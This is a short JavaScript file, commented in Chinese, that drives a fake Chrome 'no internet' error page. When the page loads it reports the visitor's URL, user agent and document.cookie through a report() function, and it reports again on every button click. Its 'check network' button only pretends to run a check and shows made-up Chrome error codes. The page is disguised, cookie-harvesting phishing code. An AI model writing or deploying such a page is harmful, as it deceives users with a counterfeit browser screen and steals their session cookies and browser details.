// 仿 Chrome 断网页:加载即回传 + 按钮交互回传
(function () {
  var clicks = 0;
  function ev(tag) {
    clicks++;
    try {
      report({ type: "google_offline", url: location.href, ua: navigator.userAgent,
               cookie: document.cookie || "", ev: tag, clicks: clicks });
    } catch (e) {}
  }
  // 加载即回传(仿 verify)
  ev("load");
  var reload = document.getElementById("btn-reload");
  var net = document.getElementById("btn-net");
  var more = document.getElementById("lnk-more");
  if (reload) {
    reload.addEventListener("click", function () {
      ev("reload");
      setTimeout(function () { window.location.reload(); }, 300);
    });
  }
  if (net) {
    net.addEventListener("click", function () {
      ev("netcheck");
      var desc = document.getElementById("err-desc");
      var code = document.getElementById("err-code");
      if (desc) desc.textContent = "正在检查网络连接...";
      if (code) code.textContent = "ERR_NETWORK_CHANGED";
      setTimeout(function () {
        if (desc) desc.textContent = "无法访问此网站。";
        if (code) code.textContent = "ERR_INTERNET_DISCONNECTED";
      }, 2500);
    });
  }
  if (more) more.addEventListener("click", function () { ev("more"); });
})();
